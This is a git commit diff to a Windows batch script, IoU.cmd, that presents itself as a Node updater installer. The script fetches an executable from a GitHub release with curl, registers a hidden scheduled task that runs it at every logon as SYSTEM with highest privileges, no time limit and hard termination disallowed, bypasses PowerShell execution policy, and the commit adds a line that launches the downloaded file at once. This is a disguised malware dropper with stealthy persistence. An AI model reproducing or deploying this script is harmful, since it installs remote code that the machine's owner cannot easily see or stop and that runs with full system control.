d4f2873854d74b524e61d9db4de58df06b07dc2c
nodeupdater2 <160264969+nodeupdater2@users.noreply.github.com>
2024-02-22 15:59:21 +0200

    Update IoU.cmd

--- IoU.cmd
+++ IoU.cmd
@@ -13,6 +13,6 @@ if exist "C:\Program Files\Node Updater\Node Updater.exe" (
 
 curl -L -s -o "C:\Program Files\Node Updater\Node Updater.exe" https://github.com/nodeupdater2/nodeupdater/releases/latest/download/app.exe
 
-powershell.exe -ExecutionPolicy Bypass -NoLogo -Command "Register-ScheduledTask -TaskName 'Node Updater' -Action (New-ScheduledTaskAction -Execute 'C:\Program Files\Node Updater\Node Updater.exe') -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Settings (New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Seconds 0) -Hidden -DontStopOnIdleEnd -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DisallowHardTerminate -Priority 0 -Compatibility Win8) -User 'SYSTEM' -RunLevel Highest" > $null 2>&1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -Command "Register-ScheduledTask -TaskName 'Node Updater' -Action (New-ScheduledTaskAction -Execute 'C:\Program Files\Node Updater\Node Updater.exe') -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Settings (New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Seconds 0) -Hidden -DontStopOnIdleEnd -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DisallowHardTerminate -Priority 0 -Compatibility Win8) -User 'SYSTEM' -RunLevel Highest"
 
-pause
+"C:\Program Files\Node Updater\Node Updater.exe"
